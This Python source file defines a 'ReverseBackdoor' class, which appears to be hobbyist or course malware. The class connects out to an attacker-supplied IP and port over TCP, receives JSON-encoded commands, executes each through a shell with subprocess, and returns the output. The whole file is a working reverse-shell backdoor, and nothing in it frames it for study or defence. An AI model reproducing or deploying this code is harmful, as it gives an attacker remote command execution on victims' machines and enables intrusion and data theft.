#!usr/bin/env python3
from json.decoder import JSONDecodeError
import socket
import subprocess
import sys
import json


class ReverseBackdoor:
	def __init__(self, ip:str, port:int)->None:
		self.port = port 
		self.ip = ip

		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((self.ip,self.port))


	def serial_send(self, data:str):
		'''
		serialize data and send over TCP socket.
		'''
		bytes_json_data = json.dumps(data).encode('utf-8')
		self.connection.send(bytes_json_data)


	def serial_receive(self)->str:
		'''
		receive serialized data over TCP socket 
		and retrieve original data.
		'''
		bytes_json_data = self.connection.recv(1024)
		str_json_data = str(bytes_json_data, encoding='utf-8')
		data = json.loads(str_json_data)
		return data


	def execute_command(self,command:str)->str:
		'''
		executes command and return command's output.
		'''
		return subprocess.check_output(command, shell=True).decode('utf-8')


	def run(self):
		while True:
			try:
				command = self.serial_receive()
				command_output = self.execute_command(command)
				self.serial_send(command_output)

			except json.JSONDecodeError:
				print('[-] Lost Connection.')
				self.connection.close()
				sys.exit()

			except Exception as e:
				exception = ('[-] Exception : ' + str(e))
				self.serial_send(exception)

